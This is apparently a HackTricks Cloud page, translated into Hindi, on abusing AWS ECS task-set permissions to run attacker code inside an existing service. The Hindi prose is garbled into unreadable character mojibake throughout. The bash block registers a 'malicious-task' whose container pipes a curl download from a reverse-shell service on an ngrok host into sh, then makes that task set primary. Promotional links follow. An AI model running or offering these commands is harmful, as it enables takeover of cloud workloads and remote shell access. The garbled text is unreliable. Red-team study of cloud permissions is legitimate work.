‡§ú‡§ø‡§®‡§ï‡•á ‡§™‡§æ‡§∏ `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, ‡§î‡§∞ `ecs:DescribeTaskSets` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Ç ‡§π‡•à‡§Ç, ‡§µ‡•á **‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ECS ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§∏‡•á‡§ü ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§∏‡•á‡§ü ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§á‡§∏‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã **‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à**‡•§
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ**: ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∏‡•á‡§µ‡§æ ‡§Æ‡•á‡§Ç ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§â‡§∏‡§ï‡•Ä ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§™‡§∞ ‡§Ö‡§∏‡§∞ ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä ‡§ö‡•ã‡§∞‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ‡§ï‡•á ‡§∏‡§æ‡§• AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç**, ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§è‡§ï‡•ç‡§∏‡§ï‡•ç‡§≤‡•Ç‡§∏‡§ø‡§µ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) ‡§Æ‡•á‡§Ç **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** ‡§Ø‡§æ [**telegram group**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** ‡§™‡§∞ üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm) ‡§ï‡•ã **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç**‡•§
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡•á‡§™‡•ã‡§ú‡§º ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§™‡§®‡•Ä ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
